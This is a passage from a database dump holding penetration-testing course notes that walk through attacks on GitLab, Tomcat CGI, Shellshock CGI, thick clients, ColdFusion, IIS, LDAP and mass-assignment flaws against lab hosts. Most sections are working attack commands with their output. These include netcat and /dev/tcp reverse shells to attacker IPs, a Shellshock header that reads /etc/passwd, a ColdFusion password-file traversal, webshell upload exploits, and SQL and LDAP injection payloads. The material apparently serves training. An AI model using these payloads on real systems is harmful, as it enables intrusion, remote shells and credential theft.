This confirms root is a valid existing user. The same technique works for email addresses — if an email is already taken, the error "Email has already been taken" confirms it exists. This technique works even if sign-up is disabled — the /users/sign_up page is still accessible for enumeration.

---

# Attacking GitLab

Even unauthenticated access to a GitLab instance can lead to sensitive data compromise. GitLab has 553 CVEs reported as of September 2021, with several severe ones leading to remote code execution. GitLab Community Edition version 13.10.2 and lower suffered from an authenticated RCE due to ExifTool mishandling metadata in uploaded image files. Username enumeration can also be leveraged to mount password spraying attacks. GitLab''s defaults in versions below 16.6 allow 10 failed login attempts before a 10-minute automatic lockout — this must be considered when brute-forcing. Starting with GitLab version 16.6, administrators can configure these values through the admin UI using max_login_attempts and failed_login_attempts_unlock_period_in_minutes.

## Username Enumeration

Use the enumeration script to find valid usernames:

```bash
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

What each flag does:

```
--url       — the target GitLab URL
--userlist users.txt  — a file containing usernames to test
```

Output:

```
[+] The username root exists!
[+] The username bob exists!
```

Valid users root and bob confirmed. These can now be targeted with a controlled password spraying attack using common weak passwords like Welcome1 or Password123, or re-using credentials found from breach databases.

---

## Authenticated Remote Code Execution

GitLab CE version 13.10.2 and lower is vulnerable to an authenticated RCE due to ExifTool mishandling metadata in uploaded image files (CVE not specified in content). If the instance allows self-registration, register an account and immediately use it for the exploit:

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c ''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f ''
```

What each flag does:

```
-t http://gitlab.inlanefreight.local:8081  — the target GitLab URL
-u mrb3n                                   — the registered username
-p password1                               — the account password
-c ''...''                                   — the command to execute (a bash reverse shell one-liner using mkfifo)
```

Exploit steps the script performs:

```
1. Authenticates with the provided credentials
2. Creates a payload image file with malicious ExifTool metadata
3. Uploads the payload as a snippet attachment
4. Triggers ExifTool processing which executes the embedded command
```

Start listener first:

```bash
nc -lnvp 8443
```

Output:

```
[1] Authenticating
Successfully Authenticated
[2] Creating Payload
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

Shell received:

```
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
git@app04:~/gitlab-workhorse$ id
uid=996(git) gid=997(git) groups=997(git)
git@app04:~/gitlab-workhorse$ ls
VERSION
config.toml
flag_gitlab.txt
sockets
```

Shell confirmed as the git user on the GitLab server.

---

# Attacking Tomcat CGI

CVE-2019-0232 is a critical security issue affecting Windows systems with the enableCmdLineArguments feature enabled on Apache Tomcat''s CGI Servlet. It affects Tomcat versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93. The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM — typically CGI scripts written in Perl, Python, or Bash. The enableCmdLineArguments setting controls whether command line arguments are created from the query string; when set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments. On Windows systems, this fails to properly validate input from the web browser before passing it to the CGI script, leading to OS command injection by appending commands using & as a separator.

---

## Enumeration

### Step 1 — Nmap Scan

```bash
nmap -p- -sC -Pn 10.129.204.227 --open
```

What each flag does:

```
-p-     — scan all 65535 ports
-sC     — run default NSE scripts
-Pn     — skip host discovery (assume host is up)
--open  — only show open ports
```

Output identifies:

```
8009/tcp open  ajp13
8080/tcp open  http-proxy  Apache Tomcat/9.0.17
```

Apache Tomcat 9.0.17 is running on port 8080 — within the vulnerable range for CVE-2019-0232.

---

## Finding a CGI script

### Step 2 — Fuzz for .CMD Extensions

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

What each flag does:

```
-w /usr/share/dirb/wordlists/common.txt           — the wordlist to use for fuzzing
-u http://10.129.204.227:8080/cgi/FUZZ.cmd        — the URL with FUZZ as the placeholder
.cmd                                               — appends the .cmd extension to each attempt
```

No results found for .cmd on this Windows target.

### Step 3 — Fuzz for .BAT Extensions

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

Output:

```
[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome
```

welcome.bat found! Navigating to http://10.129.204.227:8080/cgi/welcome.bat returns:

```
Welcome to CGI, this section is not functional yet. Please return to home page.
```

---

## Exploitation

### Step 4 — Test Command Injection with dir

```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

What this does: Appends &dir to the CGI script URL using & as the batch command separator. The dir command lists directory contents. This returns the directory listing confirming the vulnerability.

### Step 5 — Retrieve Environment Variables

```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

What this does: The set command prints all environment variables. From the output we see the PATH variable has been unset, so we need to hardcode full paths for commands.

### Step 6 — Execute whoami with Full Path (URL Encoded)

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

What this does: URL encodes the path c:\windows\system32\whoami.exe because Apache Tomcat uses a regular expression patch to prevent special characters. URL encoding bypasses this filter:

```
%3A = :
%5C = \
```

This successfully executes whoami on the target Windows system.

---

# Attacking Common Gateway Interface (CGI) Applications - Shellshock

A Common Gateway Interface (CGI) is middleware between web servers, external databases, and information sources used to help a web server render dynamic pages. CGI scripts and programs are kept in the /CGI-bin directory on a web server and can be written in C, C++, Java, or PERL. They are used for guest books, forms, mailing lists, blogs, and any case where the webserver must dynamically interact with the user. The Shellshock vulnerability (CVE-2014-6271) was discovered in 2014 in GNU Bash up to version 4.3 — at discovery it was a 25-year-old bug. It allows attackers to exploit old versions of Bash that save environment variables incorrectly: when saving a function as a variable, vulnerable Bash versions execute commands included after the function definition. CGI scripts run in the security context of the web server (typically www-data) and pass environment variables including HTTP headers like User-Agent, making them the primary attack vector for Shellshock.

---

## Enumeration - Gobuster

### Step 1 — Find CGI Scripts

```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

What each flag does:

```
dir   — directory enumeration mode
-u http://10.129.204.231/cgi-bin/  — the target URL pointing to the cgi-bin directory
-w /usr/share/wordlists/dirb/small.txt  — the wordlist to use
-x cgi  — append .cgi extension to each wordlist entry
```

Output:

```
/access.cgi  (Status: 200) [Size: 0]
```

CGI script access.cgi found. Test it with cURL:

```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

Output:

```
HTTP/1.1 200 OK
Content-Length: 0
Content-Type: text/html
```

Returns empty content but 200 status — worth investigating further.

---

## Confirming the Vulnerability

### Step 2 — Test Shellshock via User-Agent

```bash
curl -H ''User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd'' bash -s :'''' http://10.129.204.231/cgi-bin/access.cgi
```

What this does: Injects the Shellshock payload into the User-Agent header via -H. The payload structure is:

```
() { :; }  — defines an empty function (the Shellshock trigger)
;           — ends the function definition
echo ; echo ;  — adds blank lines for clean output
/bin/cat /etc/passwd  — the malicious command to execute
```

When the CGI script processes this header and passes it to Bash as an environment variable, vulnerable Bash executes the commands after the function definition. Output returns the full /etc/passwd file, confirming the vulnerability.

---

## Exploitation to Reverse Shell Access

### Step 3 — Get Reverse Shell

Start listener:

```bash
sudo nc -lvnp 7777
```

Trigger reverse shell:

```bash
curl -H ''User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1'' http://10.129.204.231/cgi-bin/access.cgi
```

What this does: Injects a bash reverse shell as the Shellshock payload. /bin/bash -i starts an interactive bash shell. >& /dev/tcp/10.10.14.38/7777 redirects stdin, stdout, and stderr to the TCP connection. 0>&1 redirects input from the same connection.

Listener output:

```
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
www-data@htb:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell confirmed as www-data. From here, enumerate for privilege escalation paths or pivot further into the internal network.

---

## Mitigation

The quickest way to remediate Shellshock is to update the version of Bash on the affected system. For end-of-life Ubuntu/Debian systems, the package manager may need upgrading first. For IoT devices where upgrading is not possible, ensure the system is not internet-exposed, firewall it on the internal network, and consider decommissioning it. Upgrading Bash or taking the host offline is always the best course of action.

---

# Attacking Thick Client Applications

Thick client applications are applications installed locally on computers, unlike thin client applications that run on remote servers accessed through web browsers. They do not require internet access to run and perform better in processing power, memory, and storage capacity. Thick client applications are commonly used in enterprise environments for project management, customer relationship management, inventory management, and productivity software — typically developed using Java, C++, .NET, or Microsoft Silverlight. They can be categorized into two-tier architecture (application communicates directly with the database) and three-tier architecture (application communicates with an application server which then communicates with the database via HTTP/HTTPS). Three-tier is more secure as attackers cannot communicate directly with the database. Applicable attacks include improper error handling, hardcoded sensitive data, DLL Hijacking, buffer overflow, SQL injection, insecure storage, and session management issues.

---

## Penetration Testing Steps

### Information Gathering

The first step is identifying application architecture, programming languages and frameworks, how the application and infrastructure work, technologies used on client and server sides, and entry points and user inputs. Tools used include CFF Explorer, Detect It Easy, Process Monitor, and Strings. Identifying common vulnerabilities requires understanding the application fully before attempting any exploitation.

### Client Side Attacks

Sensitive information like usernames, passwords, tokens, or service communication strings may be stored in the application''s local files. Static analysis using proper tools can reverse-engineer .NET and Java applications including EXE, DLL, JAR, CLASS, WAR formats. Dynamic analysis is also necessary as thick client applications store sensitive information in memory. Tools include Ghidra, IDA, OllyDbg, Radare2, dnSpy, x64dbg, JADX, and Frida.

### Network Side Attacks

If the application communicates with a local or remote server, network traffic analysis helps capture sensitive information transferred through HTTP/HTTPS or TCP/UDP connections. Tools include Wireshark, tcpdump, TCPView, and Burp Suite.

### Server Side Attacks

Server-side attacks in thick client applications are similar to web application attacks, covering most of the OWASP Top Ten vulnerabilities.

---

## Retrieving Hardcoded Credentials from Thick-Client Applications

### Step 1 — Run and Monitor the Executable

```cmd
C:\Apps>.\Restart-OracleService.exe
```

What this does: Runs the Oracle restart service executable. It appears to do nothing visible but actually creates and deletes temp files. Download ProcMon64 from SysInternals and monitor the process — it reveals the executable creates a temp file in C:\Users\Matt\AppData\Local\Temp.

### Step 2 — Prevent File Deletion

Right-click C:\Users\Matt\AppData\Local\Temp → Properties → Security → Advanced → Edit the user → Show advanced permissions → Deselect Delete subfolders and files and Delete checkboxes → OK → Apply.

What this does: Prevents the service from deleting its temp files, allowing us to capture them before they disappear.

### Step 3 — Capture the Batch File

Run Restart-OracleService.exe again and check the temp folder:

```cmd
dir C:\Users\cybervaca\AppData\Local\Temp\2
```

Output shows 6F39.bat and 6F39.tmp files were created (names are random each time).

### Step 4 — Analyze the Batch File

Reading the batch file content shows it writes base64 data to c:\programdata\oracle.txt, then runs a PowerShell script monta.ps1 that decodes the base64 to restart-service.exe, runs it, then deletes everything. Modify the batch file to remove the deletion lines and run it again. The oracle.txt and monta.ps1 files are preserved.

### Step 5 — Extract and Run the PowerShell Script

```powershell
cat C:\programdata\monta.ps1
```

The script reads oracle.txt, concatenates the base64 lines, removes spaces, and writes the decoded bytes to restart-service.exe. Run the script to obtain the executable:

```powershell
ls C:\programdata\
```

Output shows restart-service.exe created (432273 bytes).

### Step 6 — Analyze with x64dbg and dnSpy

Load restart-service.exe in x64dbg. Navigate to Options → Preferences → uncheck everything except Exit Breakpoint. Load the file and follow to Memory Map. Find the mapped region with size 0x3000, type MAP, protection -RW--. Double-click it — MZ magic bytes in the ASCII column confirm it is a DOS executable. Export by right-clicking → Dump Memory to File.

```powershell
C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin
```

Output reveals .NETFramework,Version=v4.0 — this is a .NET executable. Use De4Dot to deobfuscate:

Drag restart-service_00000000001E0000.bin onto de4dot.exe. This generates a cleaned .bin file. Drag the cleaned file onto DnSpy.exe to view the C# source code which reveals hardcoded credentials — a custom runas.exe with hardcoded Oracle service credentials.

---

## Exploiting Web Vulnerabilities in Thick-Client Applications

Thick client applications with three-tier architecture can be susceptible to web-specific attacks like SQL Injection and Path Traversal despite their architectural security advantage. In this scenario, an FTP server with anonymous access contains fatty-client.jar and several note files. The notes reveal: the server was reconfigured to run on port 1337 instead of 8000, the client still uses the old port, Java 8 is required, and login credentials are qtc:clarabibi. Running the JAR produces a "Connection Error!" because the port must be updated from 8000 to 1337. The application must be decompiled, modified, repackaged, and re-signed to work correctly.

### Path Traversal

#### Step 1 — Add Server to Hosts File

```cmd
C:\> echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```

What this does: Maps the server IP to the hostname the application expects, resolving the DNS lookup.

#### Step 2 — Extract and Modify the JAR

Extract fatty-client.jar and find port 8000 in beans.xml:

```powershell
ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
```

Edit beans.xml and change value = "8000" to value = "1337".

#### Step 3 — Remove Signature Files and Rebuild

Delete META-INF/1.RSA and META-INF/1.SF. Remove all SHA-256 hash entries from META-INF/MANIFEST.MF, keeping only the header lines. Rebuild:

```cmd
cd fatty-client
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

What this does: jar -cmf creates a new JAR file using the specified manifest file with all files in the current directory.

#### Step 4 — Exploit Path Traversal

In the FileBrowser, the server filters / characters from input. Decompile with JD-GUI and modify ClientGuiTest.java to change the folder path:

```java
ClientGuiTest.this.currentFolder = "..";
try {
  response = ClientGuiTest.this.invoker.showFiles("..");
```

Recompile, rebuild the JAR, and navigate to FileBrowser → Config. The directory listing now shows fatty-server.jar — a traversal one level up was successful.

### SQL Injection

Decompiling fatty-server.jar reveals the checkLogin() function uses unparameterized SQL:

```java
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username=''" + user.getUsername() + "''");
```

The username is passed directly into the query without sanitization. The password is hashed as sha256(username+password+"clarabibimakeseverythingsecure") before comparison.

To exploit this using a UNION injection, modify User.java to send the password as plaintext instead of hashed:

```java
public void setPassword(String password) {
    this.password = password;
}
```

Rebuild the JAR and log in with this username payload:

```
abc'' UNION SELECT 1,''abc'',''a@b.com'',''abc'',''admin
```

And password: abc

What this does: The SQL query becomes:

```sql
select id,username,email,password,role from users where username=''abc'' UNION SELECT 1,''abc'',''a@b.com'',''abc'',''admin''
```

The first SELECT fails (no user abc), the UNION SELECT returns a fake user with role admin and password abc. The server compares password abc with the sent password abc — match! Login succeeds as admin.

---

# ColdFusion - Discovery & Enumeration

ColdFusion is a programming language and web application development platform based on Java, initially developed by Allaire Corporation in 1995, acquired by Macromedia in 2001, and then by Adobe Systems. ColdFusion Markup Language (CFML) is the proprietary language with HTML-like syntax used to develop dynamic web applications. It includes tags and functions for database integration, web services, email management, and other common web development tasks. Key benefits include rapid development of data-driven web applications, easy database integration (Oracle, SQL Server, MySQL), simplified web content management, high performance optimized for low latency and high throughput, and real-time collaboration features. ColdFusion uses several default ports: 80 (HTTP), 443 (HTTPS), 1935 (RPC), 25 (SMTP), 8500 (SSL), and 5500 (Server Monitor). Known ColdFusion CVEs include arbitrary file upload (CVE-2021-21087), Active Directory misconfiguration (CVE-2020-24453), command injection (CVE-2020-24450), arbitrary file reading (CVE-2020-24449), and XSS (CVE-2019-15909).

---

## Enumeration

ColdFusion can be identified by port scanning (ports 80, 443), file extensions (.cfm or .cfc), HTTP headers (Server: ColdFusion or X-Powered-By: ColdFusion), error messages referencing ColdFusion-specific tags, and default files like CFIDE/administrator/index.cfm.

### Step 1 — Nmap Scan

```bash
nmap -p- -sC -Pn 10.129.247.30 --open
```

Output:

```
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
```

Port 8500 is a default ColdFusion SSL port. Browse to http://10.129.247.30:8500 which lists two directories: CFIDE and cfdocs, confirming ColdFusion. Browse to /CFIDE/administrator which loads the ColdFusion 8 Administrator login page — ColdFusion 8 confirmed.

---

# Attacking ColdFusion

Now that ColdFusion 8 is confirmed, we use searchsploit to find known exploits. ColdFusion 8 has two particularly relevant exploits: a Directory Traversal vulnerability (CVE-2010-2861) and an Unauthenticated Remote Code Execution (CVE-2009-2265). CVE-2010-2861 affects multiple ColdFusion files including CFIDE/administrator/settings/mappings.cfm, logging/settings.cfm, datasources/index.cfm, j2eepackaging/editarchive.cfm, and CFIDE/administrator/enter.cfm, allowing attackers to read arbitrary files by manipulating the locale parameter. CVE-2009-2265 is an unauthenticated file upload vulnerability in the FCKeditor package allowing unauthenticated users to upload files and gain RCE.

## Searchsploit

```bash
searchsploit adobe coldfusion
```

What this does: Searches the local Exploit Database copy for exploits matching "adobe coldfusion". Output shows multiple results including "Adobe ColdFusion - Directory Traversal" and "Adobe ColdFusion 8 - Remote Command Execution (RCE)".

---

## Directory Traversal

### Step 1 — Copy and Run the Exploit

```bash
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py
```

Output shows usage:

```
usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
```

### Step 2 — Read the password.properties File

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

What this does: Exploits CVE-2010-2861 by manipulating the locale parameter in a vulnerable ColdFusion page to read the password.properties file at the specified path using ../ traversal sequences.

Output:

```
trying /CFIDE/wizards/common/_logintowizard.cfm
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```

The encrypted admin password hash is retrieved. The password.properties file stores encrypted passwords for various services including database connections, mail servers, and LDAP servers.

---

## Unauthenticated RCE

### Step 1 — Copy the RCE Exploit

```bash
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

### Step 2 — Modify the Exploit with Target Information

Edit the exploit script to set correct values:

```python
lhost = ''10.10.14.55''   # HTB VPN IP
lport = 4444            # Listener port
rhost = "10.129.247.30" # Target IP
rport = 8500            # Target port
filename = uuid.uuid4().hex
```

### Step 3 — Run the Exploit

```bash
python3 50057.py
```

What the exploit does step by step:

```
1. Generates a JSP payload of 1497 bytes
2. Uploads the payload via the FCKeditor file upload path: /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
3. Returns the uploaded shell URL
4. Executes the payload
5. Establishes a reverse shell connection
```

Output:

```
Sending request and printing response...
Upload Success... Webshell path: http://10.129.247.30/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp
Listening for connection...
Executing the payload...
```

Reverse shell received:

```
Microsoft Windows [Version 6.1.7600]
C:\ColdFusion8\runtime\bin>dir
```

Full Windows command shell obtained on the ColdFusion server.

---

# IIS Tilde Enumeration

IIS tilde directory enumeration is a technique used to uncover hidden files, directories, and short file names (8.3 format) on some versions of Microsoft IIS web servers. Windows generates a short file name in 8.3 format for every file or folder created — 8 characters for the name, a period, and 3 characters for the extension. The tilde (~) character followed by a sequence number signifies a short file name in a URL. If a short file name is discovered, it can be used to access corresponding files even if they were meant to be hidden. The enumeration works by sending HTTP requests with different character combinations in the URL to identify valid short file names, starting with http://example.com/~a through ~z and progressively narrowing down each character. The number after ~ (like ~1 or ~2) is a unique identifier distinguishing files with similar names within the same directory.

---

## Enumeration

### Step 1 — Nmap Scan

```bash
nmap -p- -sV -sC --open 10.129.224.91
```

Output:

```
80/tcp open  http  Microsoft IIS httpd 7.5
```

IIS 7.5 running on port 80 — this version is vulnerable to tilde enumeration.

### Step 2 — Tilde Enumeration Using IIS ShortName Scanner

```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

What each argument does:

```
0  — scan mode (0 = default)
5  — number of threads
http://10.129.204.231/  — target URL
```

Output:

```
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
|_ Identified files: 3
    |_ CSASPX~1.CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

The short name TRANSF~1.ASP is found but the target does not permit direct GET access, so we need to brute-force the full filename.

### Step 3 — Generate a Custom Wordlist

```bash
egrep -r ^transf /usr/share/wordlists/* | sed ''s/^[^:]*://'' > /tmp/list.txt
```

What this does:

```
egrep -r ^transf /usr/share/wordlists/*  — recursively searches all wordlists for lines starting with "transf"
| sed ''s/^[^:]*://''                      — removes the filename and colon prefix from egrep output
> /tmp/list.txt                          — saves results to a new wordlist file
```

### Step 4 — Gobuster with Custom Wordlist

```bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

What each flag does:

```
dir   — directory enumeration mode
-u http://10.129.204.231/  — target URL
-w /tmp/list.txt           — our custom wordlist of words starting with "transf"
-x .aspx,.asp              — test each word with both .aspx and .asp extensions
```

Output:

```
/transf**.aspx  (Status: 200) [Size: 941]
```

The full filename is discovered — a .aspx file corresponding to the short name TRANSF~1.ASP is found and confirmed accessible with a 200 status code.

---

# LDAP

LDAP (Lightweight Directory Access Protocol) is a protocol used to access and manage directory information — hierarchical data stores containing information about network resources such as users, groups, computers, and printers. LDAP is efficient with fast queries, supports a global naming model ensuring unique entries, is extensible for custom attributes, compatible across platforms running over TCP/IP and SSL, and provides authentication mechanisms for single sign-on. However, LDAP requires directory servers to be compliant (limiting vendor choices), is complex for many administrators, does not encrypt traffic by default (requiring LDAPS or StartTLS), and is vulnerable to LDAP injection attacks. LDAP works using a client-server architecture where clients send requests encoded in ASN.1 transmitted over TCP/IP. Common ports are 389 (standard) and 636 (LDAPS). Two popular implementations are OpenLDAP (open-source) and Microsoft Active Directory (Windows-based with additional features like policy administration and SSO).

---

## Enumeration

### Step 1 — Nmap Scan

```bash
nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
```

What each flag does:

```
-p-            — scan all ports
-sC            — run default scripts
-sV            — version detection
--open         — show only open ports
--min-rate=1000  — send at least 1000 packets per second for speed
```

Output:

```
80/tcp  open  http  Apache httpd 2.4.41 ((Ubuntu))
389/tcp open  ldap  OpenLDAP 2.2.X - 2.3.X
```

An HTTP server on port 80 and OpenLDAP on port 389 are detected. The web application likely uses LDAP for authentication.

### ldapsearch Example

```bash
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

What each flag does:

```
-H ldap://ldap.example.com:389        — the LDAP server URL and port
-D "cn=admin,dc=example,dc=com"       — the bind DN (Distinguished Name) to authenticate as
-w secret123                          — the password for authentication
-b "ou=people,dc=example,dc=com"      — the base DN to search under
"(mail=john.doe@example.com)"         — the LDAP filter to match entries
```

---

## LDAP Injection

### Step 2 — Test LDAP Injection with Wildcard

Attempting to log in using a wildcard character * in both username and password fields:

```
Username: *
Password: *
```

What this does: The LDAP query becomes:

```
(&(objectClass=user)(sAMAccountName=*)(userPassword=*))
```

The * wildcard matches any value, so the query returns the first user in the directory regardless of credentials — effectively bypassing authentication. This grants access to the system without valid credentials, confirming the LDAP injection vulnerability.

To prevent LDAP injection: thoroughly validate and sanitize user input before incorporating into LDAP queries, remove LDAP-specific special characters like *, (, ), |, &, and use parameterized queries ensuring user input is treated as data only.

---

# Web Mass Assignment Vulnerabilities

Web mass assignment vulnerability is a type of security vulnerability where attackers can modify model attributes of an application through parameters sent to the server. Several frameworks offer mass-assignment features that allow developers to directly insert a whole set of user-entered data into an object or database. Without a whitelist protecting the fields, attackers can use this to steal sensitive information or destroy data. Ruby on Rails is a web framework commonly associated with this vulnerability type. The attack involves an attacker finding unprotected model attributes by reversing application code, then assigning values to critical parameters during HTTP requests to modify database data and change intended functionality. The fix is to use strong parameters or whitelisting methods provided by the framework, explicitly allowing only specific attributes to be mass-assigned.

---

## Exploiting Mass Assignment Vulnerability

### Step 1 — Register a Normal Account

Browse to the registration page and register normally. The response confirms account creation but login shows "Account is pending approval" — an admin must approve registration.

### Step 2 — Analyze the Source Code

Reading /opt/asset-manager/app.py reveals the registration logic:

```python
try:
  if request.form[''confirmed'']:
    cond=True
except:
  cond=False
```

The confirmed parameter sets the cond (condition) variable. If confirmed is present in the form data, cond is set to True, bypassing the pending approval check.

### Step 3 — Exploit via Burp Suite

Capture the HTTP POST request to /register using Burp Suite. Modify the request parameters to add the confirmed parameter:

```
username=new&password=test&confirmed=test
```

What this does: The confirmed parameter is present in the POST data, so the Python code sets cond=True and inserts the user with approval already granted. The mass assignment vulnerability allows us to set the confirmed field that was never intended to be user-controllable.

### Step 4 — Log in

Log in with new:test credentials — access granted without waiting for admin approval. The mass assignment vulnerability is successfully exploited.

---

# Attacking Applications Connecting to Services

Applications connected to services often include connection strings that can be leaked if not protected. This section covers enumerating and exploiting applications connected to other services to collect information and move laterally or escalate privileges. Connection strings contain credentials for databases, APIs, and other services — if they are hardcoded in binaries or accessible via debugging tools, they represent a critical finding.

---

## ELF Executable Examination

### Step 1 — Run the Binary

```bash
./octopus_checker
```

Output:

```
Program had started..
Attempting Connection
Connecting ...
[unixODBC][Driver Manager]Can''t open lib ''ODBC Driver 17 for SQL Server'' : file not found
connected
```

The binary attempts a SQL connection. The ODBC driver is missing locally but the binary contains the connection string.

### Step 2 — Load in GDB with PEDA

```bash
gdb ./octopus_checker
```

```assembly
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
```

What this does: set disassembly-flavor intel sets the disassembly to Intel syntax (easier to read). disas main disassembles the main function showing all call instructions and string references. The disassembly reveals a call to SQLDriverConnect.

### Step 3 — Set Breakpoint and Run

```assembly
gdb-peda$ b *0x5555555551b0
gdb-peda$ run
```

What this does: Sets a breakpoint at the SQLDriverConnect function address. When the program runs and reaches this breakpoint, we can inspect the registers. The RDX register contains the full connection string:

```
RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
```

The credentials username:password are exposed in the connection string and can be used to connect to the MSSQL service directly or tested for reuse across other network services.

---

## DLL File Examination

### Step 1 — Examine the DLL Metadata

```powershell
Get-FileMetaData .\MultimasterAPI.dll
```

Output reveals .NETFramework,Version=v4.6.1 and an internal API endpoint http://localhost:8081 with POST method — confirming this is a .NET assembly.

### Step 2 — Decompile with dnSpy

Load MultimasterAPI.dll into dnSpy. Navigate to MultimasterAPI.Controllers → ColleagueController. The source code reveals a database connection string containing hardcoded credentials in plaintext. These credentials can be used to connect to the MSSQL service directly or tested against other services via password spraying.

---

# Other Notable Applications

Though this module focuses on specific applications, many others are encountered during real-world penetration tests. Large enterprise assessments can produce EyeWitness reports with 500+ pages of web application screenshots. The methodology learned throughout this module — fingerprinting, enumeration, checking for default credentials, looking for built-in functionality leading to RCE, and searching for known CVEs — applies to every application encountered, not just the ones explicitly covered. Below are honorable mentions worth knowing:

**Axis2** — can be abused similarly to Tomcat. Often sits on top of a Tomcat installation. Check for weak admin credentials and upload a webshell as an AAR file. A Metasploit module exists for this.

**WebSphere** — has many historical vulnerabilities. Default credentials system:manager can allow WAR file deployment similar to Tomcat for RCE.

**Elasticsearch** — has had several vulnerabilities and is sometimes found forgotten on large enterprise networks. The HTB machine Haystack features Elasticsearch.

**Zabbix** — open-source system and network monitoring with vulnerabilities including SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and RCE. Has built-in functionality abusable for RCE via the Zabbix API. HTB box Zipper demonstrates this.

**Nagios** — system and network monitoring product with a wide variety of historical issues including RCE, root privilege escalation, SQL injection, and stored XSS. Check for default credentials nagiosadmin:PASSW0RD.

**WebLogic** — Java EE application server with 190 reported CVEs including many unauthenticated RCE exploits, many being Java Deserialization vulnerabilities from 2007 through 2021.

**Wikis/Intranets** — internal Wikis (MediaWiki), SharePoint, custom intranet pages often have document repositories or search functionality revealing valid credentials. Always search for downloadable documents and use any available search feature to look for passwords, keys, and configuration data.

**DotNetNuke (DNN)** — open-source CMS written in C# using .NET. Historical issues include authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download.

**vCenter** — used in large organizations to manage multiple ESXi instances. Check for weak credentials and vulnerabilities including Apache Struts 2 RCE and the unauthenticated OVA file upload (CVE-2021-22005). vCenter often runs as SYSTEM or even domain admin — an extremely high-value target.

The core lesson from this entire module is that a combination of thorough enumeration, checking for default credentials, understanding built-in functionality, and knowing common CVEs is the methodology that produces results on any application — familiar or completely unknown. A single set of default credentials or an overlooked built-in feature can be all that is needed to fully compromise a system.', NULL, 'PUBLISHED', 'PUBLIC', 79, 'cmvcsa9i0000hidr0sh1y58oz', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792354294.53), to_timestamp(1792354294.53), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmve9lavv00w3idi4r4yamac8', 'Footprinting & Network Services Enumeration', 'footprinting-network-services-enumeration', '---', '# Footprinting & Network Services Enumeration

---

## Table of Contents

- [Section 1: Enumeration Methodology (6 Layers)](#section-1-enumeration-methodology)
- [Section 2: Domain Information](#section-2-domain-information)
- [Section 3: Cloud Resources](#section-3-cloud-resources)
- [Section 4: Staff — OSINT on Employees](#section-4-staff--osint-on-employees)
- [Section 5: FTP — Full Detail (TFTP, vsFTPd, All Commands, Nmap NSE, OpenSSL)](#section-5-ftp-file-transfer-protocol)
- [Section 6: SMB — (Samba, RPCclient, samrdump, SMBmap, CrackMapExec, Enum4Linux-ng)](#section-6-smb-server-message-block)
